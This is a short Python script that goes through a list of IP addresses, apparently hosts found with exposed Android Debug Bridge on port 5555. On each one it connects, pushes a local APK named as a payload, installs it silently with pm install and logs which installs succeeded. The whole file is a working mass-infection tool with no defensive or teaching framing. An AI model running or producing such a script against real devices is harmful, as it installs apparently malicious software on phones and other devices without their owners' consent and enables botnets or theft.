import subprocess
import time

ADB_PAYLOAD = "/root/adb.apk"
DEVICE_PATH = "/sdcard/Download/adb.apk"
TARGET_FILE = "adb_hits.txt"
LOG_FILE = "payload_results.txt"

def adb_push(ip):
    subprocess.run(["adb", "connect", f"{ip}:5555"], capture_output=True)
    subprocess.run(["adb", "push", ADB_PAYLOAD, DEVICE_PATH], capture_output=True)
    install = subprocess.run(["adb", "shell", "pm", "install", DEVICE_PATH], capture_output=True, text=True)
    status = "SUCCESS" if "success" in install.stdout.lower() else "FAILED"
    with open(LOG_FILE, "a") as f:
        f.write(f"{ip} - {status}\n")

def main():
    with open(TARGET_FILE, "r") as f:
        targets = f.read().splitlines()
    for ip in targets:
        adb_push(ip)
        time.sleep(2)

if __name__ == "__main__":
    main()
